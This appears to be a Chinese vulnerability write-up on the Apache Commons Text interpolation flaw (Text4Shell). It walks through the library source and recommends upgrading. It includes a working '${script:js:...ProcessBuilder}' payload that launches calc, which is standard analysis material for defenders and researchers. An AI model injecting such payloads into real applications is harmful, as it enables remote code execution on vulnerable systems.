<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yp4bg7UuBrRj1lVvcEMu6g)

扫码领资料

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFJNibV2baHRo8G34MZhFD1sjTz4LHLiaKG9208VTU6pdTIEpC9jlW6UVfhIb9rHorCvvMsdiaya4T6Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

### 漏洞介绍#

根据 apache 官方给出的说明介绍到 Apache Commons Text 执行变量插值，允许动态评估和扩展属性的一款工具包，插值的标准格式是 "${prefix:name}"，其中 "prefix" 是用于定位 org.apache.commons.text.lookup 类，执行插值的是 StringLookup 接口，接口中定义了 lookup 方法。在 1.5 到 1.9 的版本中，默认的 Lookup 实例集包括可以导致任意代码执行的表达式，如 javax.script、dns、url 等加载方式。

### 影响范围#

1.5 <= Apache Commons Text <= 1.9

### 组件使用介绍#

Apache Commons Text 组件通常在开发过程中用于占位符和动态获取属性的字符串编辑工具包，这里我搞了个 Demo 来简单介绍下使用方法：

```
import org.apache.commons.text.StringSubstitutor;

class Demo{
  public static void main(String[] args){
      String resolvedString = StringSubstitutor
                .replaceSystemProperties("You are running with java.version = ${java.version} and os.name = ${os.name}.");
       
      System.out.println(resolvedString);
       
      final StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
      interpolator.setEnableSubstitutionInVariables(true); // Allows for nested $'s.
      final String text = interpolator.replace("Base64 Decoder:${base64Decoder:SGVsbG9Xb3JsZCE=}\n"
          + "Date:                 ${date:yyyy-MM-dd}\n" + "DNS:                   ${dns:address|apache.org}\n"
          + "Environment Variable: ${env:USERNAME}\n"
          + "Script:               ${script:javascript:3 + 4}\n" + "System Property:       ${sys:user.dir}\n");
      System.out.println(text);
  }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGnD97lViaM1Xc9g7cTKMBUbjiaG1icX0I0YCzXHJdicmtFj7gVm6vibv3EdSkXQSZwlNoxqojuKp9bAEA/640?wx_fmt=png)

因此该组件常用于数据库查询前的语句替换，或者页面输出的时候替换。

### 漏洞复现#

```
import org.apache.commons.text.StringSubstitutor;

class Demo{
  public static void main(String[] args){
      StringSubstitutor stringSubstitutorInterpolator = StringSubstitutor.createInterpolator();
      String payload = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";
      stringSubstitutorInterpolator.replace(payload);
  }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGnD97lViaM1Xc9g7cTKMBUbshrr1HqkspE7W4locr8N9XQZZ1C4GkQFTzwH0EcazNDOURU4rbME7A/640?wx_fmt=png)

### 代码分析#

先从 StringSubstitutor.replace 方法中跟入

```
public String replace(final String source) {
  if (source == null) {
      return null;
  }
  final TextStringBuilder buf = new TextStringBuilder(source);
  if (!substitute(buf, 0, source.length())) {
      return source;
  }
  return buf.toString();
}

```

调用了 substitute 解析传入的字符串

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGnD97lViaM1Xc9g7cTKMBUbZ1x397M9ZjwCl8nbzNA8sPoSlEzibSCf40caaT0NWfYRSxEXXicYib0Pw/640?wx_fmt=png)

方法中解析了头部和尾部的 ${}，把其中的值取出来进一步解析

```
protected String resolveVariable(final String variableName, final TextStringBuilder buf, final int startPos,
                                final int endPos) {
  final StringLookup resolver = getStringLookup();
  if (resolver == null) {
      return null;
  }
  return resolver.lookup(variableName);
}

```

这里获取的 StringLookup 就是之前使用 StringSubstitutor.createInterpolator() 创建实例化对象的地方

```
public static StringSubstitutor createInterpolator() {
  return new StringSubstitutor(StringLookupFactory.INSTANCE.interpolatorStringLookup());
}

```

并在构造方法中调用了 this.setVariableResolver(variableResolver) 设置 VariableResolver 为 InterpolatorStringLookup 类，之后继续跟入 InterpolatorStringLookup 的 lookup 方法中。

```
@Override
public String lookup(String var) {       //var="script:js:new java.lang.ProcessBuilder("calc").start()"
  if (var == null) {
      return null;
  }

  final int prefixPos = var.indexOf(PREFIX_SEPARATOR);
  if (prefixPos >= 0) {
      final String prefix = toKey(var.substring(0, prefixPos));
      final String name = var.substring(prefixPos + 1);
      final StringLookup lookup = stringLookupMap.get(prefix);
      String value = null;
      if (lookup != null) {
          value = lookup.lookup(name);
      }

      if (value != null) {
          return value;
      }
      var = var.substring(prefixPos + 1);
  }
  if (defaultStringLookup != null) {
      return defaultStringLookup.lookup(var);
  }
  return null;
}

```

方法截取了 ":" 前面的 script 关键词，并以此为索引获取对应的 StringLookup 对象

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGnD97lViaM1Xc9g7cTKMBUbUXnvFqdH0mjkX2UzNb7s78hicy0GzySInJiaw4HbAMdYZSYnDMMdg0Ew/640?wx_fmt=png)

可以看到系统支持的类型有 18 种操作方式

并在后续调用了 ScriptStringLookup.lookup 方法

```
@Override
public String lookup(final String key) {
  if (key == null) {
      return null;
  }
  final String[] keys = key.split(SPLIT_STR, 2);
  final int keyLen = keys.length;
  if (keyLen != 2) {
      throw IllegalArgumentExceptions.format("Bad script key format [%s]; expected format is EngineName:Script.",
                                              key);
  }
  final String engineName = keys[0];
  final String script = keys[1];
  try {
      final ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByName(engineName);
      if (scriptEngine == null) {
          throw new IllegalArgumentException("No script engine named " + engineName);
      }
      return Objects.toString(scriptEngine.eval(script), null);
  } catch (final Exception e) {
      throw IllegalArgumentExceptions.format(e, "Error in script engine [%s] evaluating script [%s].", engineName,
                                              script);
  }
}

```

之后的代码就是获取 js 脚本引擎，并通过 ScriptEngine.eval 的方法执行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGnD97lViaM1Xc9g7cTKMBUbbzHJpcVjvG2suufa2STRmvwYIytrYiar5BXmfchicLUF86vDicjND9gOg/640?wx_fmt=png)

关于这个引擎的使用和介绍可以看这篇文章：https://www.qieseo.com/329754.html

Nashorn 扩展可以使 JVM 在运行时动态调用 JavaScript 脚本的能力，大大提升了开发时的灵活机动性。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGnD97lViaM1Xc9g7cTKMBUbNojqjGmLlSG8oUdh95wFx3OPcryBr3sCyeo3wl9VbuaTV8C8C6NQiaQ/640?wx_fmt=png)

### 修复建议#

升级版本到 Apache Commons Text 1.10.0 版本。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGnD97lViaM1Xc9g7cTKMBUbfPngh31kb58j1qrB3CyBJ3nJicNfa3KRa7jP1yT2BSZibsGLB24d9DeA/640?wx_fmt=png)

可以看到在 1.10.0 版本中是删掉了 script 的功能的，但是还是存在有 xml 和 file 等功能类可以深入研究下。

### Reference#

[1].https://lists.apache.org/thread/n2bd4vdsgkqh2tm14l1wyc3jyol7s1om

[2].https://github.com/apache/commons-text/commit/b9b40b903e2d1f9935039803c9852439576780ea

[3].https://commons.apache.org/proper/commons-text/javadocs/api-release/org/apache/commons/text/StringSubstitutor.html

[4].https://www.qieseo.com/329754.html

[5].https://github.com/naumanshah03/apache-commons-text-rce/blob/5ea6611e6d74da3274bebca1d64fd5c2de01f09a/src/main/java/org/nauman/Main.java

```
来源: https://www.cnblogs.com/wh4am1/p/16795499.html

```

声明：**⽂****中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。所有渗透都需获取授权！**

@

**学习更多渗透技能！体验靶场实战练习**

```
（hack视频资料及工具）


```

（部分展示）

往期推荐

【精选】SRC 快速入门 + 上分小秘籍 + 实战指南

爬取免费代理，拥有自己的代理池

漏洞挖掘｜密码找回中的套路

渗透测试岗位面试题 (重点：渗透思路)

漏洞挖掘 | 通用型漏洞挖掘思路技巧

干货｜列了几种均能过安全狗的方法！

一名大学生的黑客成长史到入狱的自述

攻防演练｜红队手段之将蓝队逼到关站！

巧用 FOFA 挖到你的第一个漏洞

**看到这里了，点个 “赞”、“再看” 吧**